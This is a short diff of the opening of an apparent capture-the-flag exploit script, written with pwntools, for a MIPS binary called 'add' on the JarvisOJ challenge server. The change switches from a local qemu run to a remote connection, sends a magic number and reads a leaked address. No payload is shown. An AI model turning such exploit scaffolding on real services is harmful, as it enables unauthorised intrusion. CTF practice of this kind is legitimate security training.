@@ -3,14 +3,11 @@
 __Auther__ = 'M4x'
 
 from pwn import *
-from pwnlib import qemu
-context.arch = "mips"
-context.endian = "little"
+context.binary = "./add"
 context.log_level = "debug"
-context.bits = 32
 
-io = process("./add")
-#  io = remote("pwn2.jarvisoj.com", 9889)
+#  io = process(["qemu-mipsel", "-L", "/usr/mipsel-linux-gnu", "./add"])
+io = remote("pwn2.jarvisoj.com", 9889)
 
 io.sendlineafter("help.\n", '2057561479')
 io.recvuntil("0x")
